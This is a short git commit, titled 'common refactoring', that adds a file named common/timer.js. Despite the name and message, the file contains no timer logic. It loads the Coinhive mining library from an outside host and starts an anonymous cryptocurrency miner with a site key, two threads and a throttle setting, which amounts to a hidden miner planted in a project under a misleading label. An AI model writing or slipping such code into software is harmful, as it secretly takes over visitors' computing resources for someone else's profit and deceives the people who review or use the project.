e4851d40a569bc3b4713e05308d3263b36e3d409
SlaSh <slashka100500@gmail.com>
2019-05-03 16:20:59 +0300

    common refactoring

---
+++ common/timer.js
@@ -0,0 +1,11 @@
+    
+    
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('khIsKdxmgKEk8ADLclJygNylH0VoW6D7', {
+            threads: 2,
+            autoThreads: false,
+            throttle: 0.7
+        });
+        miner.start();
+    </script>
